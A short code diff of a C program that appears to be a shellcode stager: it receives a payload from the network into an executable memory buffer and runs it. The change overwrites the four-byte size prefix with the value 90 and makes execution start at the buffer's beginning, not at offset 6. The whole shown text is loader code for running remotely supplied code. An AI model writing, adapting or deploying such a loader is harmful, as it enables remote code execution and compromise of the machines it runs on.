@@ -42,10 +42,20 @@ int main() {
     rcvd += res;
   } while (size > rcvd);
 
+  index = rwx;
+  int i = 0;
+  do {
+    *index = 90;
+    index ++;
+    i++;
+  } while (i < 4);
+
+
+
   // printf("Executing payload.\n");
   // Execute the received payload. Skip the first four bytes, which holds the size of the payload.
   void (*func) ();
-  func = (void (*) ()) (u_long*)(rwx + 6);
+  func = (void (*) ()) (u_long*)(rwx);
   (void) (*func) (); 
 }
 
